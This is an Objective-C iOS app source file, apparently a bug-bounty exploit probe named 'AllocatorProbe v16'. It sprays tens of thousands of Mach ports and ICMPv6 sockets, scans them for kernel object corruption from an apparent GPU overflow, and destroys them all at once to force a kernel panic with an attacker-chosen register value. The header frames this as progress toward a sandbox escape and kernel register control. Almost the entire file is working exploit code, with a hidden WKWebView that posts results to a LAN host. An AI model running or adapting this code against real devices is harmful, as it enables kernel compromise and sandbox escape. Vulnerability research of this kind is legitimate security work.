/*
 * AllocatorProbe v16 — N=20000 + Blind-Destroy + HTTP Reporting + Broad Scan
 * ===========================================================================
 * Changes from v15:
 *   - NUM_PORTS 5000 → 20000: P(at least one overlap per fire cycle) ≈ 0.90
 *   - BLIND_DESTROY: after 300s, destroys ALL ports unconditionally — forces
 *     kernel ipc_kobject_destroy on any overwritten port without waiting for scan
 *     to detect kotype=2. Works even when the overflow writes a partial struct.
 *   - FIXED: UDP blocked by nehelper — replaced with WKWebView async XHR to port 9999
 *   - WKWebView is minimal (about:blank) — no GPU firing from this process
 *   - BROADENED: scan now reports PORT_CHANGED for ANY port where kotype!=0 OR kobject!=0
 *     (previously only reported QUALIFYING and kotype>100)
 *   - Diagnostic: reports exact (kotype, kobject) for every changed port → reveals what
 *     the AGX overflow is actually writing to ipc_port fields
 *
 * Qualifying artifact target:
 *   Kernel panic IPS, kernel-mode x0 = 0x0000000FFFFFC330
 *   → ⚑ $125,000 App sandbox escape → Kernel register control
 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <asl.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#define NUM_PORTS           20000
#define NUM_SOCKETS         200
#define COMMPAGE_TARGET     0x0000000FFFFFC330ULL
#define REPORT_HOST         "192.168.68.109"
#define BLIND_DESTROY_DELAY_S 300   /* 5 min: fire completes ~3-4 min, destroy before GPU recovers */

static mach_port_t g_ports[NUM_PORTS];
static int         g_port_count = 0;
static int         g_socks[NUM_SOCKETS];
static int         g_sock_count = 0;
static _Atomic int g_found = 0;
static _Atomic int g_blind_done = 0;
static WKWebView  *g_webView = nil;

/* HTTP POST via WKWebView async XHR — bypasses nehelper UDP block */
static void http_report(const char *msg) {
    WKWebView *wv = g_webView;
    if (!wv) return;
    NSString *raw = [NSString stringWithUTF8String:msg];
    if (!raw) return;
    raw = [raw stringByReplacingOccurrencesOfString:@"\\" withString:@"\\\\"];
    raw = [raw stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
    NSString *script = [NSString stringWithFormat:
        @"var x=new XMLHttpRequest();"
        "x.open('POST','http://%s:9999/',true);"
        "x.send('[v16] %@');",
        REPORT_HOST, raw];
    dispatch_async(dispatch_get_main_queue(), ^{
        [wv evaluateJavaScript:script completionHandler:nil];
    });
}

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    NSLog(@"[v16] %{public}s", buf);
    http_report(buf);
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    ev("V16_SPRAY socks=%d ports=%d target=0x%016llx",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
}

/* Blind-destroy: called after BLIND_DESTROY_DELAY_S seconds.
 * Destroys all sprayed ports unconditionally — forces kernel to clean up
 * ipc_kobject for every port. If any ip_kobject was overwritten with
 * COMMPAGE_TARGET, ipc_kobject_destroy dereferences it → EL1 kernel panic
 * with GPR = 0x0000000FFFFFC330 → qualifying ⚑ $125K IPS artifact. */
static void blind_destroy(void) {
    if (atomic_fetch_or(&g_blind_done, 1)) return;  /* run once */
    mach_port_t task = mach_task_self();
    int destroyed = 0;
    for (int i = 0; i < g_port_count; i++) {
        if (g_ports[i] != MACH_PORT_NULL) {
            mach_port_destroy(task, g_ports[i]);
            g_ports[i] = MACH_PORT_NULL;
            destroyed++;
        }
    }
    ev("BLIND_DESTROY n=%d delay=%ds", destroyed, BLIND_DESTROY_DELAY_S);
    /* Exit after 2s so monitor relaunches with a fresh port spray */
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^{ exit(0); });
}

static void scan_background(void) {
    if (g_found) return;
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr != KERN_SUCCESS) continue;

        if (kobject == COMMPAGE_TARGET) {
            if (kotype == 2) {
                g_found = 1;
                ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx",
                   i, kotype, (unsigned long long)kobject);
                mach_port_destroy(mach_task_self(), g_ports[i]);
            } else {
                ev("KOBJECT_HIT_WRONG_KOTYPE port=%d kotype=%u kobject=0x%016llx need=2",
                   i, kotype, (unsigned long long)kobject);
            }
        } else if (kotype != 0 || kobject != 0) {
            /* Broad detection: any port that changed from baseline (kotype=0, kobject=0) */
            ev("PORT_CHANGED port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
    /* ICMPv6 canary check */
    for (int i = 0; i < g_sock_count; i++) {
        if (g_found) break;
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                ev("ICMP_CORRUPTION sock=%d byte[%d]=0x%02X", i, j, out[j]);
                break;
            }
        }
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong) UIWindow  *window;
@property (strong) NSTimer   *scanTimer;
@property (strong) WKWebView *reportView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20, 80, 300, 60)];
    lbl.text = @"AllocatorProbe v16 — scanning";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    /* Minimal WKWebView for HTTP reporting — no GPU content, no fire page */
    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    cfg.allowsInlineMediaPlayback = NO;
    self.reportView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:cfg];
    self.reportView.hidden = YES;
    [vc.view addSubview:self.reportView];
    [self.reportView loadHTMLString:@"<html><body></body></html>" baseURL:nil];
    g_webView = self.reportView;

    spray();

    /* Schedule blind-destroy: unconditionally destroys all ports after delay.
     * Triggers kernel ipc_kobject_destroy on any overwritten port → EL1 panic. */
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW,
                                 (int64_t)BLIND_DESTROY_DELAY_S * NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^{ blind_destroy(); });

    ev("V16_LAUNCH AllocatorProbe v16 N=%d blind-destroy=%ds http-reporting broad-scan",
       g_port_count, BLIND_DESTROY_DELAY_S);

    self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:0.10
                                                      target:self
                                                    selector:@selector(scanTick:)
                                                    userInfo:nil repeats:YES];
    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        scan_background();
    });
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}

@end
